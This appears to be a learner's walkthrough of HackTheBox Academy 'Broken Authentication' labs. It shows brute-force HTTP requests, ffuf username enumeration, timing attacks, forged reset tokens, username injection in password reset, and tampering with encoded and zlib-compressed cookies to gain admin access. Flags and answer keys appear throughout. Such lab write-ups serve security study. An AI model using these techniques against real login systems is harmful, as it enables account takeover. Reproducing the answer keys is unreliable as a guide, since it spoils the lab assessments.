@@ -1,0 +1,580 @@
+[Default Credentials]
+
+[*] Target: 46.101.82.246:30660
+
+[Question 1] Inspect the login page and perform a brute force attack. What is the valid username?
+
+    [Step 1] Create wordlist
+
+        [Note] You can use the 'CBBH - HMI_SCADA.txt' I uploaded
+
+    [Step 2] Brute Force
+
+            POST / HTTP/1.1
+            Host: 46.101.82.246:30660
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 27
+            Origin: http://46.101.82.246:30660
+            Connection: close
+            Referer: http://46.101.82.246:30660/
+            Upgrade-Insecure-Requests: 1
+
+            Username=§test§&Password=§pass§
+
+        >> Intruder >> Cluster bomb >> Payload set 1 & 2
+
+        => advantech:admin is the correct credential
+
+    [!] Answer: "advantech"
+
+
+[Weak Bruteforce Protections]
+
+[*] Target: 159.65.84.175:30575
+
+[Question 1] Observe the web application based at subdirectory /question1/ and infer rate limiting. 
+             What is the wait time imposed after an attacker hits the limit? (round to a 10-second timeframe, e.g., 10 or 20)
+
+    - After entering some wrong credential 6 times, they said that I need to wait for 37-second until the next try
+
+    [!] Answer: "40"
+
+[Question 2]  Work on webapp at URL /question2/ and try to bypass the login form using one of the method showed. What is the flag?
+
+    - Go to http://159.65.84.175:30575/question2/ then entered a random username and password
+
+        POST /question2/ HTTP/1.1
+        Host: 159.65.84.175:30575
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 74
+        Origin: http://159.65.84.175:30575
+        Connection: close
+        Referer: http://159.65.84.175:30575/question2/
+        Upgrade-Insecure-Requests: 1
+
+        userid=hungthinhtrandeptraiprovip&passwd=nhoczvipcoolngau_9X&submit=submit
+
+        <head>
+            <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <title>Broken Authentication Login - Source IP check</title>
+        ...
+
+    => As you can see in the title "Broken Authentication Login - Source IP check" this server doesn't trust our IP
+
+    => I added "X-Forwarded-For: 127.0.0.1"
+
+    [?] X-Forwarded-For (XFF) header is an HTTP header that is used to identify the originating IP address of a client connecting to a web server through a proxy or load balancer.
+
+        POST /question2/ HTTP/1.1
+        Host: 159.65.84.175:30575
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        ...
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 127.0.0.1
+
+        userid=hungthinhtrandeptraiprovip&passwd=nhoczvipcoolngau_9X&submit=submit
+
+        => Great work localhost user! Your flag is HTB{127001>31337}
+    
+    [!] Answer: "HTB{127001>31337}"
+
+
+[Brute Forcing Usernames]
+
+[*] Target: 46.101.82.246:31927
+
+[Question 1] Find the valid username on the web app based at the /question1/ subdirectory. PLEASE NOTE: Use the same wordlist for all four questions.
+
+    - Go to http://46.101.82.246:31927/question1/ => you will see "Broken Authentication Login - User unknown" 
+
+        GET /question1/?Username=thinh&Password=123 HTTP/1.1
+        Host: 46.101.82.246:31927
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://46.101.82.246:31927/question1/
+        Upgrade-Insecure-Requests: 1
+
+        => Invalid username
+
+    - Now we need to find the valid username
+
+        # ffuf -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -u 'http://46.101.82.246:31927/question1/?Username=FUZZ&Password=123' -fs 2098
+
+             /'___\  /'___\           /'___\       
+            /\ \__/ /\ \__/  __  __  /\ \__/       
+            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+             \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+              \ \_\   \ \_\  \ \____/  \ \_\       
+               \/_/    \/_/   \/___/    \/_/       
+
+            v2.0.0-dev
+        ________________________________________________
+
+        :: Method           : GET
+        :: URL              : http://46.101.82.246:31927/question1/?Username=FUZZ&Password=123
+        :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
+        :: Follow redirects : false
+        :: Calibration      : false
+        :: Timeout          : 10
+        :: Threads          : 40
+        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+        :: Filter           : Response size: 2098
+        ________________________________________________
+
+        [Status: 200, Size: 2114, Words: 561, Lines: 63, Duration: 3072ms]
+            * FUZZ: puppet
+
+        :: Progress: [17/17] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+    [!] Answer: "puppet"
+
+[Question 2] Find the valid username for the web application based at subdirectory /question2/.
+
+    -  Go to http://46.101.82.246:31927/question2/ and enter a random username
+
+        POST /question2/ HTTP/1.1
+        Host: 46.101.82.246:31927
+        ...
+        Referer: http://46.101.82.246:31927/question2/
+        Upgrade-Insecure-Requests: 1
+
+        Username=thinhdeptraiprovip&wronguser=&count=1&Password=123
+
+    => &wronguser=&count=1 ?? I don't know what it is =((
+
+        POST /question2/ HTTP/1.1
+        Host: 46.101.82.246:31927
+        ...
+        Referer: http://46.101.82.246:31927/question2/
+        Upgrade-Insecure-Requests: 1
+
+        Username=haharandomchar&wronguser=thinhdeptraiprovip&count=1&Password=123   
+
+    => Oh! my previous username is stored as the wrong username, so we need to test all kinds of username until we have a right one
+
+        POST /question2/ HTTP/1.1
+        Host: 46.101.82.246:31927
+        ...
+        Referer: http://46.101.82.246:31927/question2/
+        Upgrade-Insecure-Requests: 1
+
+        Username=yugiohpro&wronguser=haharandomchar&count=1&Password=123
+
+    => Yeah! exactly what I thought
+
+    - Because /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt is the only wordlist that appear in this section, I will try every single username of it ONE BY ONE
+
+    => F*CK you HackTheBox
+
+    => After 10 minutes of trying, I found that ansible is the valid username
+
+        POST /question2/ HTTP/1.1
+        Host: 46.101.82.246:31927
+        ...
+        Referer: http://46.101.82.246:31927/question2/
+        Upgrade-Insecure-Requests: 1
+
+        Username=ec2-user&validuser=ansible&count=1&Password=123    
+
+    [!] Answer: "ansible"
+
+[Question 3]  Find the valid account name for the web application based at subdirectory /question3/.
+
+    - Time Differences: If a fast algorithm is used, the time differences between different users would be smaller
+                        potentially leading to false positives for an attacker due to network delays or CPU load
+    => This means that the correct usernames may have a longer response time than the wrong ones
+
+    [Note] In this question, I use BigBox_Timing.py which is an optimized version of timming.py I created, I already uploaded in "CBBH - Timing Tool" folder
+
+                # python3 BigBox_Timing.py   
+                  ____ ____  ____  _   _   _____ _           _             
+                 / ___| __ )| __ )| | | | |_   _(_)_ __ ___ (_)_ __   __ _ 
+                | |   |  _ \|  _ \| |_| |   | | | | '_ ` _ \| | '_ \ / _` |
+                | |___| |_) | |_) |  _  |   | | | | | | | | | | | | | (_| |
+                 \____|____/|____/|_| |_|   |_| |_|_| |_| |_|_|_| |_|\__, |
+                                                                     |___/ 
+
+                [+] Enter the target's URL: http://46.101.82.246:31927/question3/
+
+                    [!] Username: root            | Response time: 0.707273
+                    [!] Username: admin           | Response time: 0.670615
+                    [!] Username: test            | Response time: 0.688616
+                    [!] Username: guest           | Response time: 0.681341
+                    [!] Username: info            | Response time: 0.696134
+                    [!] Username: adm             | Response time: 0.69541
+                    [!] Username: mysql           | Response time: 0.680988
+                    [!] Username: user            | Response time: 0.671824
+                    [!] Username: administrator   | Response time: 0.652653
+                    [!] Username: oracle          | Response time: 0.656456
+                    [!] Username: ftp             | Response time: 0.686874
+                    [!] Username: pi              | Response time: 0.737478
+                    [!] Username: puppet          | Response time: 0.690171
+                    [!] Username: ansible         | Response time: 0.688211
+                    [!] Username: ec2-user        | Response time: 0.678227
+                    [!] Username: vagrant         | Response time: 0.816424
+                    [!] Username: azureuser       | Response time: 0.672635
+
+                >>> The longest response time belongs to: vagrant 
+
+    [!] Answer: "vagrant"           
+
+[Question 4] Now find another way to discover the valid username for the web application based at subdirectory /question4/ .
+
+    - Go to view-source:http://46.101.82.246:31927/question4/, now you can see there is a REAL register, so now we can use a really familiar technique "This username is already registered"
+    
+        ...
+        <div class="clearfix">                                                                                                                                                                                
+            <p class="text-center"><a href="register.php">Create an Account</a></p>
+        <div> 
+        ... 
+
+        POST /question4/register.php HTTP/1.1
+        Host: 46.101.82.246:31927
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 93
+        Origin: http://46.101.82.246:31927
+        Connection: close
+        Referer: http://46.101.82.246:31927/question4/register.php
+        Upgrade-Insecure-Requests: 1
+
+        userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=bigbox&passwd2=bigbox&submit=submit
+
+        => Thanks for registering, you should receive an email with a confirmation code shortly.
+
+    - Now! Let's brute-force the username 
+
+        POST /question4/register.php HTTP/1.1
+        Host: 46.101.82.246:31927
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 93
+        Origin: http://46.101.82.246:31927
+        Connection: close
+        Referer: http://46.101.82.246:31927/question4/register.php
+        Upgrade-Insecure-Requests: 1
+
+        userid=user&email=thinh%40gmail.com&passwd1=bigbox&passwd2=bigbox&submit=submit
+
+        => Username or email already registered, click <a href=#>here
+
+    [!] Answer: "user"
+
+
+[Brute Forcing Passwords]
+
+[*] Target: 167.99.192.213:32611
+
+[Question 1] Using rockyou-50.txt as password wordlist and htbuser as the username, find the policy and filter out strings that don't respect it. What is the valid password for the htbuser account?
+
+    [Step 1] "find the policy and filter out strings that don't respect it"
+
+        ... userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=123&passwd2=123&submit=submit => Password doesn't match minimum requirements.
+
+        ... userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=thinh123&passwd2=thinh123&submit=submit => Password doesn't match minimum requirements.
+
+        ... userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=thinh123!&passwd2=thinh123!&submit=submit => Password doesn't match minimum requirements.
+
+        ... userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=Thinh123!&passwd2=Thinh123!&submit=submit => Thanks for registering, you should receive an email with a confirmation code shortly.
+
+        ... userid=thinhdeptraiprovip&email=thinh%40gmail.com&passwd1=Thinh123&passwd2=Thinh123&submit=submit => Thanks for registering, you should receive an email with a confirmation code shortly.
+
+        => So now, we know that the password must contain number(s) and capitalization(s)
+
+        => sed '/[A-Z]/!d; /[0-9]/!d' ../rockyou-50.txt > /home/bigbox/Desktop/rockboy.txt
+
+    [Step 2] Find the password
+
+        POST / HTTP/1.1
+        Host: 167.99.192.213:32611
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 39
+        Origin: http://167.99.192.213:32611
+        Connection: close
+        Referer: http://167.99.192.213:32611/
+        Upgrade-Insecure-Requests: 1
+
+        userid=htbuser&passwd=§random_password§&submit=submit
+
+        => After 10 tries => "Too many login failures, please wait 40 seconds before retry"
+
+        => But there are only 6 passwords left, we need to delete the tried ones and then continuing brute force
+
+        => ANGEL1 is the correct password
+
+    [!] Answer: "ANGEL1"
+
+
+[Predictable Reset Token]
+
+[*] Target: 134.209.176.83:30251
+
+[Question 1]  Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button.
+              Within an interval of +-1 second a token for the htbadmin user will also be created.
+              The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug.
+              Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?
+
+    - About Apache open meeting bug:
+
+        <?php
+        function generate_reset_token($username) {
+        $time = intval(microtime(true) * 1000);
+        $token = md5($username . $time);
+        return $token;}
+
+    If "htbuser" created token at 2023-06-04 11:13:42am (with milisecond equal to 00 like 11:13:42:00)
+
+    => htbuser1685877222000 <=> dc6f1245bcaa458b43305d963217849c
+
+    [Note] How can I know 2023-06-04 11:13:42am equal to 1685877222000, I'm using https://www.epochconverter.com/
+           Remember to use this website, if you convert it using your Python tool, it will not be exactly because each country has difference time
+
+    - But we don't know exactly what millisecond that token was created so we need to create a wordlist that contains hashed of htbadmin + ' time + or - 2000 milliseconds
+
+    - You can use my tool to create the wordlist for this situation, I already upload it, named "CBBH - Tokens.py"
+
+        # python3 BigBox_Tokens.py
+             ____ ____  ____  _   _   _____     _                  
+            / ___| __ )| __ )| | | | |_   _|__ | | _____ _ __  ___ 
+            | |  |  _ \|  _ \| |_| |   | |/ _ \| |/ / _ \ '_ \/ __|
+            | |__| |_) | |_) |  _  |   | | (_) |   <  __/ | | \__ \
+            \____|____/|____/|_| |_|   |_|\___/|_|\_\___|_| |_|___/
+                                                                    
+
+            [+] Enter the time (after you converted using https://www.epochconverter.com/) that htbuser's token is created: 1685877222000
+
+            >>> Tokens.txt is created
+
+    - Next, use to wordlist you created to brute force htbadmin's token 
+
+        POST /question1/ HTTP/1.1
+        Host: 134.209.176.83:30251
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 22
+        Origin: http://134.209.176.83:30251
+        Connection: close
+        Referer: http://134.209.176.83:30251/question1/
+        Upgrade-Insecure-Requests: 1
+
+        token=§random_tokens§&submit=check
+
+    => token=51b631311a95f3cc84789f82e599ffc8&submit=check => Great work, your flag is HTB{uns4f3t0k3ns4r3uns4f3}
+
+    [!] Answer: "HTB{uns4f3t0k3ns4r3uns4f3}"
+
+[Question 2] Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?
+
+    - If you go to http://134.209.176.83:30251/question2/forgot.php and choose the "Show temporary password for user htbuser"
+
+        => Njg3NDYyNzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyNDA2MTYzNjE2NDY1NmQ3OTJlNjg2MTYzNmI3NDY4NjU2MjZmNzgyZTY1NzUzYTc1NmU2MjcyNjU2MTZiNjE2MjZjNjU=
+
+    - Which after base64 decoded & hex decoded is equal to "htbuser:htbuser@academy.hackthebox.eu:unbreakable"
+
+    - Now we just need a little change <=> "htbadmin:htbadmin@academy.hackthebox.eu:unbreakable" >> hex encoded >> base64 encoded
+
+        => Njg3NDYyNjE2NDZENjk2RTNBNjg3NDYyNjE2NDZENjk2RTQwNjE2MzYxNjQ2NTZENzkyRTY4NjE2MzZCNzQ2ODY1NjI2Rjc4MkU2NTc1M0E3NTZFNjI3MjY1NjE2QjYxNjI2QzY1
+
+    - Login with htbadmin:Njg3NDYyNjE2NDZENjk2RTNBNjg3NDYyNjE2NDZENjk2RTQwNjE2MzYxNjQ2NTZENzkyRTY4NjE2MzZCNzQ2ODY1NjI2Rjc4MkU2NTc1M0E3NTZFNjI3MjY1NjE2QjYxNjI2QzY1
+
+        => HTB{4lw4y5ch3ck3nc0d1ng}
+
+    [!] Answer: "HTB{4lw4y5ch3ck3nc0d1ng}"
+
+
+[Guessable Answers]
+
+[*] Target: 138.68.163.76:30473
+
+[Question 1]  Reset the htbadmin user's password by guessing one of the questions. What is the flag?
+
+    - Go to http://138.68.163.76:30473/forgot.php then choose the username "htbadmin"
+
+    - After lookup for all available questions: 
+
+        + "What is your favourite pizza flavour?"
+
+        + "What's your mother maiden name?"
+
+        + "What is your favourite color?"
+
+        + "What's your favourite sport team?"
+
+        + "Which is your favourite HTB box?"
+        
+        ....
+
+        - I remember that there is a wordlist called "common-surnames.txt" (which is located in SecLists/Miscellaneous/security-question-answers/)
+
+        => We can you that wordlist the find the answer to "What's your mother maiden name?"
+
+            POST /forgot.php HTTP/1.1
+            Host: 138.68.163.76:30473
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 87
+            Origin: http://138.68.163.76:30473
+            Connection: close
+            Referer: http://138.68.163.76:30473/forgot.php
+            Upgrade-Insecure-Requests: 1
+
+            question=What%27s+your+mother+maiden+name%3F&userid=htbadmin&answer=§random_answer§&submit=answer
+
+        => I found that LIBBY is the correct answer => Your flag is HTB{gu3ss4bl3_4n5w3r5_4r3_gu3ss4bl3}
+
+    [!] Answer: "HTB{gu3ss4bl3_4n5w3r5_4r3_gu3ss4bl3}"
+
+
+[Username Injection]
+
+[*] Target: 142.93.41.234:31839
+
+[Question 1] Login with the credentials "htbuser:htbuser" and abuse the reset password function to escalate to "htbadmin" user. What is the flag?
+
+    - After going to http://142.93.41.234:31839/ then login as htbuser
+
+        POST / HTTP/1.1
+        Host: 142.93.41.234:31839
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 43
+        Origin: http://142.93.41.234:31839
+        Connection: close
+        Referer: http://142.93.41.234:31839/
+        Upgrade-Insecure-Requests: 1
+
+        userid=htbuser&passwd=htbuser&submit=submit
+
+    => The username data is stored as "userid"
+
+        POST / HTTP/1.1
+        Host: 142.93.41.234:31839
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 54
+        Origin: http://142.93.41.234:31839
+        Connection: close
+        Referer: http://142.93.41.234:31839/
+        Upgrade-Insecure-Requests: 1
+
+        oldpasswd=htbuser&newpasswd=123&confirm=123&submit=doreset
+
+        => userid=htbadmin&oldpasswd=htbuser&newpasswd=123&confirm=123&submit=doreset
+
+        - The system will that htbadmin changed his/her password
+
+            <?php
+            if isset($_REQUEST['userid']) {
+                $userid = $_REQUEST['userid'];
+            } else if isset($_SESSION['userid']) {
+                $userid = $_SESSION['userid'];
+            } else {
+                die("unknown userid");}
+
+        - Now using htbadmin:123 to login
+        
+        => Welcome htbadmin!
+           And there is your flag! HTB{us3rn4m3_1nj3ct3d}
+
+    [!] Answer: "HTB{us3rn4m3_1nj3ct3d}"
+
+
+[Brute Forcing Cookies]
+
+[*] Target: 142.93.41.234:31969
+
+[Question 1] Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?
+
+    - Go to http://142.93.41.234:31969/question1/ 
+
+        =>  Welcome htbuser.
+            YOUR ROLE IS STUDENT.
+            Unfortunately, as student you dont have any flag.
+
+        => Cookie: SESSIONID=NzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyM2I3MjZmNmM2NTNhNzM3NDc1NjQ2NTZlNzQzYjc0Njk2ZDY1M2EzMTM2MzgzNTM5MzUzNTM0MzAzMA%3D%3D
+
+    - Using any hash identifer tool, you can see that after URL decoded >> Base64 decoded >> Hex ASCII decoded, we have "user:htbuser;role:student;time:1685955400"
+
+    - We need to access as super user right => "user:htbuser;role:super;time:1685955400" and then reverse the process
+
+        => NzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyM2I3MjZmNmM2NTNhNzM3NTcwNjU3MjNiNzQ2OTZkNjUzYTMxMzYzODM1MzkzNTM1MzQzMDMw
+
+        => Use this cookie and refesh the webpage => Your flag is HTB{mu1tist3p_3nc0d1ng_15_uns4f3}
+
+    [!] Answer: "HTB{mu1tist3p_3nc0d1ng_15_uns4f3}"
+
+[Question 2] Log in to the target application and tamper the remember token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.
+
+    [*] Authenticate to 142.93.41.234 with user "htbuser" and password "htbuser"
+
+        => Cookie: HTBPERSISTENT=eJwrLU4tssooSSoF0tZF%2BTmpVsUlpSmpeSXWJZm5qVaGZhamlqbmBhZmAE5hDmA%3D; PHPSESSID=pvng1bfn42hfabebnt0prk56kb
+
+    - Focus on "eJwrLU4tssooSSoF0tZF%2BTmpVsUlpSmpeSXWJZm5qVaGZhamlqbmBhZmAE5hDmA%3D" => You can see it is url encoded
+
+        => eJwrLU4tssooSSoF0tZF+TmpVsUlpSmpeSXWJZm5qVaGZhamlqbmBhZmAE5hDmA= => look like base64
+
+        => x+-N-²Ê(I*ÒÖEù9©VÅ%¥)©y%Ö%¹©Vf¦¦æf Na` nah! I don't know what it is, list check this out at https://en.wikipedia.org/wiki/List_of_file_signatures
+
+    - Using burpsuite you can see:
+
+        => 78	9c	2b	2d	4e	2d	b2	ca	28	49	2a	05	d2	d6	45	f9	<=> x+-N-²Ê(I*ÒÖEù
+
+        => 78 9c <=> Default Compression (no preset dictionary) _ Zlib
+
+    - Using any zlib decompress tool
+
+        => eJwrLU4tssooSSoF0tZF+TmpVsUlpSmpeSXWJZm5qVaGZhamlqbmBhZmAE5hDmA= <=> user:htbuser;role:student;time:1685957086
+
+    - We need to access as super user right => "user:htbuser;role:super;time:1685957086" and then reverse the process
+
+    [Note] Zlib Compressor (a google extension) is a good tool for this situation
+
+        => Using this cookie _ "eJwrLU4tssooSSoF0tZF%2BTmpVsWlBUBmSWZuqpWhmYWppam5gYUZAC0PDYg%3D"
+
+        => Glad to see you with admin privileges, here is your flag HTB{r3m3mb3r_r3m3mb3r}
+
+    [!] Answer: "HTB{r3m3mb3r_r3m3mb3r}"
+
+[Skill Assessment - Broken Authentication]
+
+    [Note] This skill assessment was so freaking brutal, I spent 2 days, trying to solve it but have no result, So! I gave up and looked for answers
+           Because of that, I'm not worthy to guide you guys. 
+
+    - How to solve this question: https://r4fik1.github.io/htb-academy/bug%20bounty%20hunter/HTBAcademy_Broken-Authentication/
+
+    [!] Answer: "HTB{1_br0k3_4uth_4_br34kf4st}"
